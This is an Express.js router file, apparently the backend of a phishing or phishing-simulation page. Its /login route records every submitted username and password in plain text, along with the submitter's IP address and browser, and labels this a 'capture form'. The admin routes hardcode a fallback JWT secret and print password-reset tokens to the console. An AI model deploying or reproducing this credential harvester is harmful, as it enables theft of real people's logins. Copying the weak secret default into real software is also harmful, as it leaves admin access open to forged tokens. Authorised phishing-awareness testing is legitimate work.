const express = require("express");
const router = express.Router();
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const LoginAttempt = require("../models/LoginAttempt");
const Admin = require("../models/Admin");

// @route POST /api/login
// @desc Record a user login attempt
router.post("/login", async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ message: "Username and password are required" });
        }

        const ipAddress = req.ip || req.connection.remoteAddress || "Unknown";
        const userAgent = req.headers["user-agent"] || "Unknown";

        const newAttempt = new LoginAttempt({
            username,
            password, // Stored in plain text for demonstration/simulation purposes
            ipAddress,
            userAgent,
            status: "success" // We can assume success since it's a capture form
        });

        await newAttempt.save();
        res.status(200).json({ message: "Login attempt recorded" });
    } catch (err) {
        console.error("Login attempt error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

// @route POST /api/admin/login
// @desc Admin login to get JWT
router.post("/admin/login", async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ message: "Email and password are required" });
        }

        const admin = await Admin.findOne({ email });
        if (!admin) {
            return res.status(401).json({ message: "Invalid credentials" });
        }

        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(401).json({ message: "Invalid credentials" });
        }

        const payload = { admin: { id: admin.id } };

        jwt.sign(
            payload, 
            process.env.JWT_SECRET || "fallback_secret_key", 
            { expiresIn: "10h" }, 
            (err, token) => {
                if (err) throw err;
                res.json({ token, email: admin.email });
            }
        );

    } catch (err) {
        console.error("Admin login error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

// @route POST /api/admin/forgot-password
// @desc Simulate sending a password reset token
router.post("/admin/forgot-password", async (req, res) => {
    try {
        const { email } = req.body;
        const admin = await Admin.findOne({ email });
        
        if (!admin) {
            return res.status(404).json({ message: "User not found" });
        }
        
        // Generate token
        const resetToken = crypto.randomBytes(20).toString('hex');
        admin.resetToken = crypto.createHash('sha256').update(resetToken).digest('hex');
        admin.resetTokenExpire = Date.now() + 10 * 60 * 1000; // 10 minutes
        await admin.save();
        
        // Output to console instead of sending real email
        console.log(`\n\n=== PASSWORD RESET SIMULATION ===`);
        console.log(`Email Sent To: ${email}`);
        console.log(`Reset Token (Simulation): ${resetToken}`);
        console.log(`Use this token in the reset password form.`);
        console.log(`=================================\n\n`);

        res.status(200).json({ message: "Reset token generated. Check server console." });
    } catch (err) {
        console.error("Forgot password error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

// @route POST /api/admin/reset-password
// @desc Reset password using token
router.post("/admin/reset-password", async (req, res) => {
    try {
        const { token, newPassword } = req.body;
        
        // Hash token to compare with DB
        const resetTokenHash = crypto.createHash('sha256').update(token).digest('hex');
        
        const admin = await Admin.findOne({
            resetToken: resetTokenHash,
            resetTokenExpire: { $gt: Date.now() }
        });
        
        if (!admin) {
            return res.status(400).json({ message: "Invalid or expired token" });
        }
        
        // Set new password
        const salt = await bcrypt.genSalt(10);
        admin.password = await bcrypt.hash(newPassword, salt);
        
        // Clear token
        admin.resetToken = undefined;
        admin.resetTokenExpire = undefined;
        
        await admin.save();
        
        res.status(200).json({ message: "Password reset successful" });
    } catch (err) {
        console.error("Reset password error:", err);
        res.status(500).json({ message: "Server error" });
    }
});

module.exports = router;
